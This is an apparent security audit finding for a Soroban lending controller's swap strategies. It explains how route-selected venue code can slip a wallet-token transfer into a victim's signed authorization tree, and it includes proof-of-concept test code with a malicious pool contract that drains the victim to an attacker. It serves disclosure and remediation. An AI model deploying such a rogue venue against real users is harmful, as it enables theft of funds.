### Title
Rogue swap route can turn a strategy authorization into arbitrary wallet-token theft - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Controller swap paths authorize only the intended `token_in.transfer(controller -> router, amount_in)` entry, but the signed authorization tree can also contain additional child invocations requested by route-selected third-party code. A malicious venue can therefore add a `token.transfer(victim -> attacker, amount)` child to the victim’s strategy authorization and drain an unrelated wallet token while still returning enough swap output for the strategy checks to pass. The controller validates only its own input spend and measured output; it does not detect or constrain unrelated children already present in the caller’s authorization tree.

### Finding Description
`swap_tokens` snapshots the controller’s input and output balances, authorizes one exact controller-to-router transfer, invokes the configured router, verifies that the controller did not gain input or overspend `amount_in`, refunds unused input, and requires positive measured output. These checks account for the routed asset legs only. [1](#0-0) 

The router’s route payload can invoke attacker-selected venue code. During that nested invocation, the venue may call an unrelated token’s `transfer(victim, attacker, amount)`. Under Soroban authorization recording, that transfer is attached as a child of the caller’s controller-strategy authorization. If the victim signs the simulated authorization tree, the host accepts the child and the wallet transfer executes. The in-scope regression test records exactly this poisoned tree beneath `swap_collateral` and shows the wallet balance moving from the victim to the attacker while the strategy still receives its fair output. [2](#0-1) 

The same signed tree is accepted under enforced authorization: without the extra child, the rogue transfer is rejected; with the recorded child, it succeeds and empties the wallet token. [3](#0-2) 

This affects every production strategy that reaches `swap_tokens`:

- `multiply`, including both the main debt-to-collateral route and the third-asset `convert_swap` path. [4](#0-3) [5](#0-4) 
- `swap_debt`. [6](#0-5) 
- `swap_collateral`. [7](#0-6) 
- `repay_debt_with_collateral` on the distinct-market swap branch. [8](#0-7) 

### Impact Explanation
This is theft of user funds. The stolen amount is not limited to the strategy input, collateral, debt, or account value. Any token held by the signing address can be transferred by a route-selected contract if the rogue transfer is included in the signed authorization tree. The swap can return a nominally fair output, leaving the protocol position solvent while the wallet loses an unrelated asset.

### Likelihood Explanation
An unprivileged attacker can deploy a malicious venue and craft route bytes that reach it. No governance role, leaked key, contract upgrade, oracle manipulation, or protocol privilege is required. Exploitation requires the victim to submit a strategy whose route traverses the malicious venue and sign the authorization tree containing the extra transfer. Because ordinary transaction simulation records the rogue child under the same strategy root, clients that present opaque or incomplete authorization details can expose users to the theft. The controller’s positive-output and final-risk checks do not prevent it.

### Recommendation
Prevent untrusted route code from adding unrelated authority-consuming calls, rather than relying on users to inspect every authorization child. Prefer an architecture in which the controller/router does not invoke arbitrary venue code within the caller’s auth context; use tightly allowlisted venue adapters or venue interfaces that cannot initiate user-token transfers. At minimum, the router should constrain hop calls to audited adapters whose code cannot invoke arbitrary token transfers, and clients should hard-fail if simulation records any child other than the documented exact input pull for that entrypoint.

### Proof of Concept
The in-tree test `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` demonstrates the attack:

1. A router decodes caller-supplied route bytes and invokes the route-selected `hop_pool`. [9](#0-8) 
2. The malicious pool reads a stored `(victim, wallet_token, attacker, amount)` plan and executes `wallet_token.transfer(victim, attacker, amount)`. [10](#0-9) 
3. Simulation records that transfer as a child under the victim’s `controller.swap_collateral` authorization, pays the expected strategy output, and moves the full wallet balance to the attacker. [11](#0-10) 
4. With enforcing authorization, signing the honest root-only tree rejects the rogue transfer; signing the simulated poisoned tree accepts it and empties the wallet. [3](#0-2)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L24-54)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-46)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L56-70)
```rust
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/strategies/multiply.rs (L90-97)
```rust
    let swapped_collateral = swap_tokens_or_passthrough(
        env,
        caller,
        &debt.asset,
        swap_amount_in,
        &collateral.asset,
        swap,
    );
```

**File:** contracts/controller/src/strategies/multiply.rs (L187-195)
```rust
        let collateral_amount = swap_tokens(
            env,
            caller,
            &payment.asset,
            received,
            &collateral.asset,
            convert,
        );
        (collateral_amount, 0)
```

**File:** contracts/controller/src/strategies/swap_debt.rs (L65-72)
```rust
    let repay_amount = swap_tokens_or_passthrough(
        env,
        caller,
        &new_debt.asset,
        amount_received,
        &existing_debt.asset,
        swap,
    );
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-65)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/repay_debt_with_collateral.rs (L108-118)
```rust
    let debt_available = withdraw_and_swap_from_supply(
        env,
        account,
        cache,
        caller,
        collateral,
        collateral_amount,
        &debt.asset,
        swap,
        events::PositionAction::RpColWd,
    );
```
